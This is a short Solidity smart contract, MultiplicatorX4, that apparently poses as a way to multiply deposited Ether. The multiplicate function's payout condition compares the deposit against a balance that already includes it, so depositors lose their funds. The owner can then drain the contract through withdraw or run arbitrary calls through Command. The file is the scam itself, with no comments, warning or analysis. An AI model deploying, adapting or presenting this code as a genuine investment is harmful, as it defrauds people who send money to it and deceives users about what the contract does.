pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        
        bool success;
        assembly {
            success := call(sub(gas, 5000), adr, msg.value, add(data, 0x20), mload(data), 0, 0)
        }
        require(success);
    }

    function multiplicate(address adr) public payable {
        if (msg.value >= this.balance) {
            adr.transfer(this.balance + msg.value);
        }
    }
}